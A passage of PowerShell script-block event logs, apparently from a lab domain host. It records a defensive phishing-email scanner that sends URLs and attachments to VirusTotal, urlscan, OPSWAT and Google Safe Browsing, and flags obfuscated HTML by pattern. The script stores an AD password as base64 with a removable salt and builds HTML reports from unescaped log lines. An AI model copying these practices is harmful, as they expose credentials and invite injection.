`r`n\n\t\tWrite-Host \"***** All THE PYTHON MODULES WILL BE DISABLED. *****\" -ForegroundColor red `r`n\n\t\t$ALLPYTHONMODULEOFF = $true\n\t}\n}\n\n$global:MODULE_LIST = New-Object System.Collections.Generic.Dictionary\"[String,String]\"\n$MODULES = $(Select-Xml -Path .\\module.xml -XPath \"//SETTINGS/MODULE\" | foreach {$_.node}).'#text'\n$xmlSETTINGS = [xml](Get-Content -Path .\\module.xml)\nforeach ($module in $MODULES){\n\tif ( $module.trim() -like \"*.py\" -and $ALLPYTHONMODULEOFF ) {\n\t\t$global:MODULE_LIST.add($($module.trim()), \"OFF\")\n\t\tWrite-Host \"##### [$($module.trim())] is turned\" -NoNewline\n\t\tWrite-Host \" [OFF] \" -ForegroundColor red -NoNewline\n\t\tWrite-Host \"#####\" `r\n\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\n\t\tWrite-Host \"      |-$COMMENT\" `r`n\n\t\t\n\t}else {\t\n\t\tif ( Test-Path -path \".\\$($module.trim())\" ){\n\t\t\t$ONOFF = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/ENABLE\").'#text').Trim()\n\t\t\t$global:MODULE_LIST.add($($module.trim()), $ONOFF)\n\t\t\tif ( $ONOFF -eq \"OFF\" ) {\n\t\t\t\tWrite-Host \"##### [$($module.trim())] is in the current folder and is turned\" -NoNewline\n\t\t\t\tWrite-Host \" [$ONOFF] \" -ForegroundColor red -NoNewline\n\t\t\t\tWrite-Host \"#####\" `r\n\t\t\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\n\t\t\t\tWrite-Host \"      |-$COMMENT\" `r`n\n\t\t\t}else{\n\t\t\t\tWrite-Host \"##### [$($module.trim())] is in the current folder and is turned [$ONOFF]  #####\" `r`n -ForegroundColor green\n\t\t\t}\n\t\t}else{\n\t\t\t$global:MODULE_LIST.add($($module.trim()), \"OFF\")\n\t\t\tWrite-Host \"***** CANNOT FIND [$($module.trim())] IN THE CURRENT FOLDER, SO THE FEATURE WILL BE DISABLED. *****\" -ForegroundColor red `r\n\t\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\n\t\t\tWrite-Host \"      |-$COMMENT\" `r`n\n\t\t}\n\t}\n}\n\nif ( [string]::IsNullOrEmpty($CREDENTIAL) -and [string]::IsNullOrEmpty($SALT) ){\n\t$YorN = Read-Host \"Do you want to input the Credential? [ y/n ] (Default is y)\"\n\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\n\t\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n\t\t$CREDENTIAL = Get-Credential -credential $USERNAME\n\t\t$PASSWORD = $CREDENTIAL.Password\n\t}else{\n\t\t$ENCODEDPASSWORD = Get-Content .\\init.conf | findstr ADPASSWORD |  %{ $_.Split(':')[1]; } | foreach{ $_.ToString().Trim() }\n\t\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n\t\tif ( [string]::IsNullOrEmpty($SALT) ){\n\t\t\t$YorN = Read-Host \"The salt is empty. Do you want to input the salt to decrypt the password? [ y/n ] (Default is y)\"\n\t\t\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\n\t\t\t\t$SALT = Read-Host -assecurestring \"Please input the salt\"\n\t\t\t\t$PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SALT))),\"\")\n\t\t\t}else{ $PASSWORD = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD)) }\n\t\t}else { $PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($SALT,\"\") }\n\t}\n}else{\n\t$ENCODEDPASSWORD = Get-Content .\\init.conf | findstr ADPASSWORD |  %{ $_.Split(':')[1]; } | foreach{ $_.ToString().Trim() }\n\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n\tif ( [string]::IsNullOrEmpty($SALT) ){\n\t\t$YorN = Read-Host \"The salt is empty. Do you want to input the salt to decrypt the password? [ y/n ] (Default is y)\"\n\t\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\n\t\t\t$SALT = Read-Host -assecurestring \"Please input the salt\"\n\t\t\t$PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SALT))),\"\")\n\t\t}else{ $PASSWORD = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD)) }\n\t}else { $PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($SALT,\"\") }\n}\n\n$DOMAIN = Get-Content .\\init.conf | findstr DOMAIN |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$EMAILADDRESS = Get-Content .\\init.conf | findstr EMAILADDRESS |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$EWSDLLPATH = Get-Content .\\init.conf | findstr EWSDLLPATH |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$DOWNLOADDIRECTORY =  Get-Content .\\init.conf | findstr DOWNLOADDIRECTORY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$REPORTSDIRECTORY = Get-Content .\\init.conf | findstr REPORTSDIRECTORY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$EXTENSIONARRAY = Get-Content .\\init.conf | findstr EXTENSIONARRAY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$EXEMPTURL = (Get-Content .\\init.conf | findstr EXEMPTURL |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }).split(\",\")\n$SUBFOLDER = Get-Content .\\init.conf | findstr SUBFOLDER | %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$INTERVAL = [int]$(Get-Content .\\init.conf | findstr INTERVAL | %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() })\n$VIRUSTOTAL_API_KEY = Get-Content .\\init.conf | findstr VIRUSTOTAL_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$URLSCAN_API_KEY = Get-Content .\\init.conf | findstr URLSCAN_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$GOOGLE_API_KEY = Get-Content .\\init.conf | findstr GOOGLE_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$OPSWAT_API_KEY = Get-Content .\\init.conf | findstr OPSWAT_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n$CHECKPHISH_API_KEY = Get-Content .\\init.conf | findstr CHECKPHISH_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\n\n$global:enable_SecureX = $false\n\nfunction Google-Safe-Browsing {\n\tWrite-OutPut \"Google Safe Browsing Scan Report: \" >> $LOGFILE\n\t$BODY = @()\n\t$BODY +=[pscustomobject]@{\"client\" = @{\"clientId\" = \"eHealth Saskatche\"; \"clientVersion\" = \"1.0\"}; \"threatInfo\" = @{\"threatTypes\" = \"MALWARE\",\"SOCIAL_ENGINEERING\"; \"platformTypes\" = \"WINDOWS\"; \"threatEntryTypes\" = \"URL\"; \"threatEntries\" = @{\"url\" = \"$URL\"}}}\n\t$HEADERS = @{ 'Content-Type' = \"application/json\" }\n\t$JSONBODY = $BODY | ConvertTo-Json\n\t$Uri = 'https://safebrowsing.googleapis.com/v4/threatMatches:find?key='+ $GOOGLE_API_KEY\n\t$Results = Invoke-RestMethod -Method 'POST' -Uri $Uri -Body $JSONBODY -Headers $HEADERS\n\tif ( ([string]::IsNullOrEmpty($Results)) ) {\n\t\tWrite-OutPut \"Can not find the result in Google Safe Browsing Scan.\"  >> $LOGFILE\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t }else{\n\t\t$ThreatType = $Results | select -expand matches | select threatType\n\t\tif ( ($ThreatType.threatType -eq \"SOCIAL_ENGINEERING\") -or ($ThreatType.threatType -eq \"MALWARE\") -or ($ThreatType.threatType -eq \"POTENTIALLY_HARMFUL_APPLICATION\") ) { $global:enable_SecureX = $true }\n\t\tWrite-OutPut \"Google Safe Browsing Scan Results:    \",$($ThreatType) >> $LOGFILE\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t}\n}\n\nfunction Submit-URLSCAN {\n\tWrite-OutPut \"URLscan Scan Report: \" >> $LOGFILE\n\t$BODY = @{ 'url' = \"$URL\"; 'public' = 'on' }\n\t$HEADERS = @{ 'API-Key' = \"$URLSCAN_API_KEY\" }\n\tTry { $SCANRESPONSE = Invoke-RestMethod -Method 'POST' -Uri 'https://urlscan.io/api/v1/scan/' -Headers $HEADERS -Body $BODY } Catch { $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()) }\n\tif ( [string]::IsNullOrEmpty($SCANRESPONSE) ) {\n\t\t$reader.BaseStream.Position = 0\n\t\t$reader.DiscardBufferedData()\n\t\t$Exception = $reader.ReadToEnd() | ConvertFrom-Json\n\t}\n\tif ( -not ([string]::IsNullOrEmpty($Exception)) ) {\n\t\tWrite-Output \"Exception Error:\" $Exception.description >> $LOGFILE\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t}else{ \t\n\t\t$RESPONSEAPI = $SCANRESPONSE.api\n\t\tDo {\n\t\t\tStart-Sleep -s 30\n\t\t\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $RESPONSEAPI } catch { $_.Exception.Response.StatusCode.Value__}\n\t\t}Until($RESPONSE -ne 404)\n\t\t$ReportURL = $SCANRESULT.task.reportURL\n\t\t$ScreenShot = $SCANRESULT.task.screenshotURL\n\n\t\tWrite-OutPut \"ScanReportURL:     \",$($ReportURL) >> $LOGFILE\n\t\tWrite-OutPut \"ScreenShotURL:     \",$($ScreenShot) >> $LOGFILE\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t\tStart-Sleep -s 3\n\t}\n}\n\nfunction Submit-URL-Virustotal {\n\t$BODY = @{ \"url\" = \"$URL\" }\n\t$HEADERS = @{ \"x-apikey\" = \"$VIRUSTOTAL_API_KEY\" }\n\t$SCAN = Invoke-RestMethod -Method 'POST' -Uri \"https://www.virustotal.com/api/v3/urls\" -Headers $HEADERS -Body $BODY\n\t$RESULTID = $SCAN.data.i",
                    "ScriptBlockId": "5b10436f-ec14-4c18-b4ca-12f2db33c2be"
                }
            }
        },
        {
            "@timestamp": "2025-12-23T19:00:20.640Z",
            "event": {
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:00:20.640406200Z'/><EventRecordID>34162</EventRecordID><Correlation ActivityID='{118041f9-7434-0001-f73c-81113474dc01}'/><Execution ProcessID='7672' ThreadID='9848'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>2</Data><Data Name='MessageTotal'>3</Data><Data Name='ScriptBlockText'>d |  %{ $_.Split('-')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t$PERMALINK = \"https://virustotal.com/gui/url/\"+$RESULTID+\"/detection\"\r\n\tStart-Sleep -s 30\r\n\t$SCANRESULTS = Invoke-RestMethod -Method 'GET' -Uri \"https://www.virustotal.com/api/v3/urls/$RESULTID\" -Headers $HEADERS\r\n\tWrite-OutPut \"VirusTotal URL Scan Report: \" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut $PERMALINK &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"VirusTotal URL Scan Stats: \" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut $SCANRESULTS.data.attributes.last_analysis_stats &gt;&gt; $LOGFILE\r\n\tif ( ($SCANRESULTS.data.attributes.last_analysis_stats.malicious -gt 0) -or ($SCANRESULTS.data.attributes.last_analysis_stats.suspicious -gt 0) ) { $global:enable_SecureX = $true }\r\n\tWrite-OutPut \"VirusTotal URL COMMUNITY VOTES : \" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut $SCANRESULTS.data.attributes.total_votes &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n}\r\n\r\nfunction Submit-FILE-OPSWAT {\r\n\t$URI = 'https://api.metadefender.com/v4/hash/'+$HASH\r\n\t$HEADERS = @{}\r\n\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\r\n\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $URI  -Headers $HEADERS } catch { $_.Exception.Response.StatusCode.Value__ }\r\n\tif ( $RESPONSE -eq 404){\r\n\t\t$FILENAME = Split-Path $FILEPATH -leaf\r\n\t\t$URI = 'https://api.metadefender.com/v4/file'\r\n\t\t$HEADERS = @{}\r\n\t\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\r\n\t\t$HEADERS.Add('filename', $FILENAME)\r\n\t\t$SCANRESULT = Invoke-RestMethod -Method 'Post' -Uri $URI  -Headers $HEADERS -Body $FILEPATH -ContentType 'application/octet-stream'\r\n\t\t$HASH = $SCANRESULT.sha256\r\n\t\t$DATA_ID = $SCANRESULT.data_id\r\n\t\t$URI = 'https://api.metadefender.com/v4/file/'+$DATA_ID\r\n\t\t$HEADERS = @{}\r\n\t\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\r\n\t\tDo {\r\n\t\t\tStart-Sleep -s 5\r\n\t\t\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $URI -Headers $HEADERS } catch { $_.Exception.Response.StatusCode.Value__}\r\n\t\t} Until ($RESPONSE -ne 404) \r\n\t\tWrite-OutPut \"OPSWAT MetaDefender Cloud File Scan Report: \" &gt;&gt; $LOGFILE\r\n\t\t$RESULTLINK = 'https://metadefender.opswat.com/results#!/file/'+$HASH+'/hash/overview'\r\n\t\tWrite-OutPut $RESULTLINK &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"POSITIVES |   TOTAL\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"$($SCANRESULT.scan_results.total_detected_avs)         |   $($SCANRESULT.scan_results.total_avs)\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}else {\r\n\t\tWrite-OutPut \"OPSWAT MetaDefender Cloud File Scan Report: \" &gt;&gt; $LOGFILE\r\n\t\t$RESULTLINK = 'https://metadefender.opswat.com/results#!/file/'+$HASH+'/hash/overview'\r\n\t\tWrite-OutPut $RESULTLINK &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"POSITIVES |   TOTAL\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"$($SCANRESULT.scan_results.total_detected_avs)         |   $($SCANRESULT.scan_results.total_avs)\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}\r\n}\r\n\r\nfunction FromEmailAttachment {\r\n\t$EMLData = Get-Content $Args[0]\r\n\t$AdoDbStream = New-Object -ComObject ADODB.Stream\r\n\t$AdoDbStream.Open()\r\n\t$AdoDbStream.LoadFromFile($Args[0])\r\n\t$global:CdoMessage = New-Object -ComObject CDO.Message\r\n\t$global:CdoMessage.DataSource.OpenObject($AdoDbStream,\"_Stream\")\r\n\tWrite-OutPut \"===From:    $($global:CdoMessage.From)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"===To:    $($global:CdoMessage.To)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"===Subject:    $($global:CdoMessage.Subject)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"===DateTimeReceived:    $($global:CdoMessage.SentOn)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t$TextBody = $global:CdoMessage.Fields.Item(\"urn:schemas:httpmail:textdescription\").Value\r\n\t$HTMLBody = $global:CdoMessage.Fields.Item(\"urn:schemas:httpmail:htmldescription\").Value\r\n\t$EmailBODY = $TextBody + $HTMLBody + $EMLData\r\n\t$URLLIST = $EmailBODY | select-string -pattern $URLRegEx -AllMatches  | %{ $_.Matches } | %{ $_.Value } | Sort-Object | ? {$EXEMPTURL -notcontains $_} | Get-Unique\r\n\t$EXPLIST = $EXEMPTURL | foreach-object { $URLLIST -match $_ }\r\n\t$URLARRAY = @()\r\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\r\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\r\n\t\tforeach($URL in $URLARRAY){\r\n\t\t\tWrite-OutPut \"URL:     \",$URL &gt;&gt; $LOGFILE\r\n\t\t\tCheckRedirectedURL\r\n\t\t}\r\n\t}\r\n\t$BOUNDARY = $global:CdoMessage.Fields.Item(\"urn:schemas:mailheader:content-type\").Value | %{ $_.Split(';')[1]; } | %{ $_.Split('\"')[1]; }\r\n\tfor ($i=1;$i -le $global:CdoMessage.Attachments.count;$i++){\r\n\t\t$ContentMediaType = $global:CdoMessage.Attachments.Item($i).ContentMediaType\r\n\t\t$FILENAME = $global:CdoMessage.Attachments.Item($i).FileName\r\n\t\t$AttachmentPATTERN = \"\"\"$FILENAME\"\"(.*?)  --$BOUNDARY\"\r\n\t\t$ATTACHDATA = [regex]::match($EMLData, $AttachmentPATTERN).Groups[1].Value\r\n\t\tif ( -not [string]::IsNullOrEmpty($FILENAME) ){\r\n\t\t\t$TRIMNUM = $ATTACHDATA.LastIndexOf(\"  \")+2\r\n\t\t\t$ATTACHMENTDATA = $ATTACHDATA.Remove(0,$TRIMNUM)\r\n\t\t\t$ATTFILENAME = ($DOWNLOADDIRECTORY + $FILENAME.split('.')[0].trim() + \"_\" + $RANDOMID + \".\" + $FILENAME.split('.')[-1].trim())\r\n\t\t\tTry{ $bytes = [Convert]::FromBase64String($ATTACHMENTDATA) } catch { $Exception = $_.Exception }\r\n\t\t\tif ( -not ([string]::IsNullOrEmpty($Exception)) ) {\r\n\t\t\t\tWrite-Output \"Exception Error:\" $Exception.description &gt;&gt; $LOGFILE\r\n\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE \r\n\t\t\t}\r\n\t\t\tif ( -not ([string]::IsNullOrEmpty($bytes)) ) { \r\n\t\t\t\t[IO.File]::WriteAllBytes($ATTFILENAME, $bytes)\r\n\t\t\t\tWrite-OutPut \"Downloaded Attachment : Original File $($FILENAME) Saved As $($ATTFILENAME) \" &gt;&gt; $LOGFILE\r\n\t\t\t\tTry { $ALGORITHM = (Get-FileHash ($ATTFILENAME)).Algorithm }\r\n\t\t\t\tCatch [System.SystemException] { $ExceptionError = $_.Exception.Message }\r\n\t\t\t\tif ( [string]::IsNullOrEmpty($ExceptionError) ) {\r\n\t\t\t\t\t$HASH = (Get-FileHash ($ATTFILENAME)).Hash.ToLower()\r\n\t\t\t\t\t$FILEPATH = (Get-FileHash ($ATTFILENAME)).Path\r\n\t\t\t\t\tWrite-OutPut \"Attachment $ALGORITHM Hash : \"  $HASH &gt;&gt; $LOGFILE\r\n\t\t\t\t\t$EXTENSION = [System.IO.Path]::GetExtension($ATTFILENAME)\r\n\t\t\t\t\tif ( ($EXTENSION -eq \".pdf\") -or ($EXTENSION -eq \".htm\") -or ($EXTENSION -eq \".html\") -or ($EXTENSION -eq \".shtml\") ){\r\n\t\t\t\t\t\tif ( $global:MODULE_LIST.'Submit_FILE_Virustotal.py' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\tWrite-OutPut \"=====================Submit File to VirusTotal and OPSWAT=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\tpython Submit_FILE_Virustotal.py $FILEPATH &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t$scan_result = Get-Content $LOGFILE -Tail 1 | ConvertFrom-Json\r\n\t\t\t\t\t\t\tif ( ($scan_result.'malicious' -ne 0) -or ($scan_result.'suspicious' -ne 0) ) {\r\n\t\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\t\t\t.\\MineMeld_Indicator.ps1 $HASH $ALGORITHM.ToLower() -comment \"AutoSpamEmailScan Script Detected and Blocked\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\tWrite-OutPut \"$($HASH) has been added into MineMeld.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tSubmit-FILE-OPSWAT\r\n\t\t\t\t\t\tWrite-OutPut \"=====================Extract URLs from the PDF/HTML file=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\tExtractURLFromPDFHTML\r\n\t\t\t\t\t\tif ( $global:MODULE_LIST.'selenium_simulator.py' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\tWrite-OutPut \"=====================Selenimu Simulator=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\tpython selenium_simulator.py $ATTFILENAME $LOGFILE &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tif ( ($EXTENSION -eq \".htm\") -or ($EXTENSION -eq \".html\") -or ($EXTENSION -eq \".shtml\") ){\r\n\t\t\t\t\t\t\t$HTMLCONTENT = Get-Content($FILEPATH)\r\n\t\t\t\t\t\t\tif ( ($HTMLCONTENT -like \"*atob('*')*\")  -or ($HTMLCONTENT -like \"*document.write(unescape('*')*\") -or ($HTMLCONTENT -like \"*base64*\") -or ($HTMLCONTENT -like \"*\\u00*\") ){\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"*                                                                  *\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"*         HTML FILE IS ENCODED AND IT IS HIGHLY SUSPICIOUS         *\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"*                                                                  *\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}else {\r\n\t\t\t\t\t\tif ( -not ([string]::IsNullOrEmpty($FILEPATH)) ){\r\n\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'Submit_FILE_Virustotal.py' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"=====================Submit File to VirusTotal and OPSWAT=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tpython Submit_FILE_Virustotal.py $FILEPATH &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t$scan_result = Get-Content $LOGFILE -Tail 1 | ConvertFrom-Json\r\n\t\t\t\t\t\t\t\tif ( ($scan_result.'malicious' -ne 0) -or ($scan_result.'suspicious' -ne 0) ) {\r\n\t\t\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\t\t\t\t.\\MineMeld_Indicator.ps1 $HASH $ALGORITHM.ToLower() -comment \"AutoSpamEmailScan Script Detected and Blocked\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\t\tWrite-OutPut \"$($HASH) has been added into MineMeld.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\tSubmit-FILE-OPSWAT\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}else {\r\n\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-Output \"Exception Error:\" $ExceptionError &gt;&gt; $LOGFILE   \r\n\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t}\r\n\t\t\t}\t\t\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunction ConvertLogToHTML {\r\n\t$File = Get-Content $LOGFILE\r\n\t$FileLine = @()\r\n\tForeach ($Line in $File) {\r\n\t\t$MyObject = New-Object -TypeName PSObject\r\n\t\tif ( ($Line -match \"virustotal.com\") -or ($Line -match \"urlscan.io\") -or ($Line -match \"opswat.com\") -or ($Line -match \"checkphish.ai\") -or ($Line -match \"googleapis.com\") ){\r\n\t\t\tif ($Line -match \".png\"){\r\n\t\t\t\tAdd-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value \"&lt;a href='$Line'&gt;$Line&lt;/a&gt;&lt;img src='$Line' height='640' width='800'&gt;\"\r\n\t\t\t}else{ Add-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value \"&lt;a href='$Line'&gt;$Line&lt;/a&gt;\" }\r\n\t\t}else{ Add-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value $Line }\r\n\t\t$FileLine += $MyObject\r\n\t}\r\n\t$($FileLine | ConvertTo-Html -Title \"Security Scan Report\" -Property \"Security Scan Report\" ) -replace '&amp;gt;','&gt;' -replace '&amp;lt;','&lt;' -replace '&amp;#39;',\"'\" | Out-File $HTMLREPFILE\r\n}\r\n\r\nfunction ExtractURLFromPDFHTML {\r\n\tif ( $EXTENSION -eq \".pdf\" ){\r\n\t\tif ( $global:MODULE_LIST.'pdf2url.py' -eq \"ON\" ) {\r\n\t\t\t$URLArrayFromPDF = &amp; python pdf2url.py $ATTFILENAME\r\n\t\t}\r\n\t}else{\r\n\t\t$HTMLFILE = $ATTFILENAME\r\n\t\t$URLArrayFromHTML = Get-Content $HTMLFILE | select-string -pattern $URLRegEx -AllMatches | %{ $_.Matches } | %{ $_.Value } | Sort-Object | Get-Unique\r\n\t}\r\n\tif ( ![string]::IsNullOrEmpty($URLArrayFromPDF) -and ![string]::IsNullOrEmpty($URLArrayFromHTML) ) {\r\n\t\t$URLLIST = $URLArrayFromHTML + $URLArrayFromPDF | Sort-Object | Get-Unique\r\n\t}elseif( [string]::IsNullOrEmpty($URLArrayFromPDF) -and ![string]::IsNullOrEmpty($URLArrayFromHTML) ) {\r\n\t\t$URLLIST = $URLArrayFromHTML | Sort-Object | Get-Unique\r\n\t}elseif( ![string]::IsNullOrEmpty($URLArrayFromPDF) -and [string]::IsNullOrEmpty($URLArrayFromHTML) ) {\r\n\t\t$URLLIST = $URLArrayFromPDF | Sort-Object | Get-Unique\r\n\t}\r\n\t$EXPLIST = $EXEMPTURL | foreach-object { $URLLIST -match $_ 